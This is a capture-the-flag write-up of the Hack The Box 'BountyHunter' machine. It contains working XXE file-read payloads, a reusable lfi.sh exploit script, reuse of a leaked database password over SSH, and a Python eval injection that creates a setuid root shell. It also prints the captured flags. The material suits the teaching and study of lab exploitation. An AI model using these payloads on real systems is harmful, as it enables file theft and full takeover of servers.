# Target
| Category          | Details                                                          |
|-------------------|------------------------------------------------------------------|
| 📝 **Name**       | [BountyHunter](https://app.hackthebox.com/machines/BountyHunter) |  
| 🏷 **Type**       | HTB Machine                                                      |
| 🖥 **OS**         | Linux                                                            |
| 🎯 **Difficulty** | Easy                                                             |
| 📁 **Tags**       | php, XXE, LFI, python                                            |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 08:57 +0200
Nmap scan report for 10.129.95.166
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.97 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ feroxbuster --url http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,js,png,jpg,py,txt,log -C 404      
<SNIP>
200      GET       24l       44w      594c http://10.129.95.166/resources/bountylog.js
<SNIP>
200      GET        0l        0w        0c http://10.129.95.166/db.php
<SNIP>
```

#### Investigate `bountylog.js`
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ curl http://$TARGET/resources/bountylog.js           
function returnSecret(data) {
        return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
        try {
                var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>${$('#exploitTitle').val()}</title>
                <cwe>${$('#cwe').val()}</cwe>
                <cvss>${$('#cvss').val()}</cvss>
                <reward>${$('#reward').val()}</reward>
                </bugreport>`
                let data = await returnSecret(btoa(xml));
                $("#return").html(data)
        }
        catch(error) {
                console.log('Error:', error);
        }
}
```
We can see that XML is being passed to `tracker_diRbPr00f314.php`. Let's try LFI with XXE vector.

#### Check is `tracker_diRbPr00f314.php` is vulnerable to XXE
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ PAYLOAD=$(echo -n '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY lfi SYSTEM "file:///etc/passwd">]><bugreport><title>&lfi;</title><cwe></cwe><cvss></cvss><reward></reward></bugreport>' | base64 | jq -sRr @uri)
curl -s http://$TARGET/tracker_diRbPr00f314.php -d "data=$PAYLOAD"
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td></td>
  </tr>
</table>
```
With `/etc/passwd` in output we have confirmed LFI over XXE.

#### Prepare `lfi.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ { cat <<'EOF'> lfi.sh
PAYLOAD=$(echo -n '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY lfi SYSTEM "php://filter/convert.base64-encode/resource='${1}'">]><bugreport><title>&lfi;</title><cwe></cwe><cvss></cvss><reward></reward></bugreport>' | base64 | jq -sRr @uri) && \
curl -s http://$TARGET/tracker_diRbPr00f314.php -d "data=$PAYLOAD" | grep -ozP '(?s)<td>Title:</td>\s*<td>\K.*?(?=</td>)' | tr -d '\0' | base64 -d
EOF
} && chmod +x lfi.sh
```

#### Read `db.php` file
File has been identified by `feroxbuster` during enumeration.
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ ./lfi.sh /var/www/html/db.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

#### Use `development:m19RoAU0hP41A1sTsq6K` credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB BountyHunter]
└─$ ssh development@$TARGET
development@10.129.95.166's password: 
<SNIP>
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
```

#### Capture user flag
```
development@bountyhunter:~$ cat /home/development/user.txt 
393d32d25c3c870d9201b11926835045
```

### Root flag

#### List allowed sudo commands
```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

#### Investigate `/opt/skytrain_inc/ticketValidator.py`
```
development@bountyhunter:~$ cat -n /opt/skytrain_inc/ticketValidator.py
<SNIP>
     4  def load_file(loc):
     5      if loc.endswith(".md"):
     6          return open(loc, 'r')
     7      else:
     8          print("Wrong file type.")
     9          exit()
    10
    11  def evaluate(ticketFile):
    12      #Evaluates a ticket to check for ireggularities.
    13      code_line = None
    14      for i,x in enumerate(ticketFile.readlines()):
    15          if i == 0:
    16              if not x.startswith("# Skytrain Inc"):
    17                  return False
    18              continue
    19          if i == 1:
    20              if not x.startswith("## Ticket to "):
    21                  return False
    22              print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
    23              continue
    24
    25          if x.startswith("__Ticket Code:__"):
    26              code_line = i+1
    27              continue
    28
    29          if code_line and i == code_line:
    30              if not x.startswith("**"):
    31                  return False
    32              ticketCode = x.replace("**", "").split("+")[0]
    33              if int(ticketCode) % 7 == 4:
    34                  validationNumber = eval(x.replace("**", ""))
    35                  if validationNumber > 100:
    36                      return True
    37                  else:
    38                      return False
    39      return False
<SNIP>
```
Analysis shows that first 3 lines requires some 'static' content. 4th line must start with `**` followed by an integer for which modulo 7 will give 4 (e.g. 11) and it's and `+` sign. Then such whole line (without `**`) is passed to `eval` function, and this is where vulnerability sits. This behavior enables arbitrary code execution through a carefully crafted payload.

#### Exploit `/opt/skytrain_inc/ticketValidator.py` to escalate to `root`
```
{ cat <<'EOF'> /tmp/ticket.md
# Skytrain Inc
## Ticket to TEST
__Ticket Code:__
**11+__import__('os').system('cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell')
EOF
} && sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py <<< /tmp/ticket.md > /dev/null && \
/tmp/root_shell -p
root_shell-5.0# id
uid=1000(development) gid=1000(development) euid=0(root) egid=0(root) groups=0(root),1000(development)
```

#### Capture root flag
```
root_shell-5.0# cat /root/root.txt 
56dacee3f35f483aaeae56e6f8051929
```
